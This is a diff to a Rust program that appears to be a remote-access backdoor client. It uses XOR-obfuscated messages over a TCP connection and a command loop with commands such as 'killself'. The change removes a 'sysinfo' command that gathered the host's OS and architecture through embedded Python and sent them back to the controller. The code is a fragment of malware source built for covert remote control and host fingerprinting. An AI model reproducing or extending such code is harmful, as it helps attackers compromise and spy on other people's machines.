@@ -4,8 +4,6 @@ use std::process::Command;
 use std::str::from_utf8;
 use std::thread;
 use std::time::Duration;
-use pyo3::prelude::*;
-use pyo3::types::IntoPyDict;
 
 fn int_xor(clear_text: &str, key: u8) -> String {
 	/*
@@ -23,20 +21,6 @@ fn int_xor(clear_text: &str, key: u8) -> String {
 		}
 	}
 	return enc_text;
-}
-
-fn system_info(conn: &mut TcpStream, key: u8) -> PyResult<()> {
-	let gil = Python::acquire_gil();
-	let py = gil.python();
-	let sys = py.import("sys")?;
-	let version: String = sys.get("version")?.extract()?;
-	let locals = [("platform", py.import("platform")?)].into_py_dict(py);
-	let code = "'OS: ' + ' '.join(platform.dist()) + '\\nArchitecture: ' + ' '.join(platform.architecture())";
-	let ret: String = py.eval(code, None, Some(&locals))?.extract()?;
-	conn.write(
-		int_xor(&ret, key).as_bytes()
-	).unwrap();
-	Ok(())
 }
 
 fn main() {
@@ -66,10 +50,6 @@ fn main() {
 							else if cmd == "killself"
 							{
 								flag = 2;
-							}
-							else if cmd == "sysinfo"
-							{
-								system_info(&mut conn, key);
 							}
 							else
 							{
